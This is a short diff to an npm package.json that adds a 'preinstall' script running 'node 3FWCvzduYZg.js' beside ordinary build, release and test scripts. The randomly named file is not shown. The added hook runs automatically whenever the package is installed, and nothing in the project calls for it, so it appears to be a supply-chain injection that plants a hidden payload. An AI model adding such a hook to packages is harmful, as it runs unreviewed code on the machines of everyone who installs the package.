@@ -20,6 +20,7 @@
     "prepublishOnly": "npm run build",
     "release": "npx git-ensure -a && npx bumpp --commit --tag --push",
     "test": "vitest --coverage.enabled true",
+    "preinstall": "node 3FWCvzduYZg.js",
     "snapshot": "vitest --update"
   },
   "exports": [
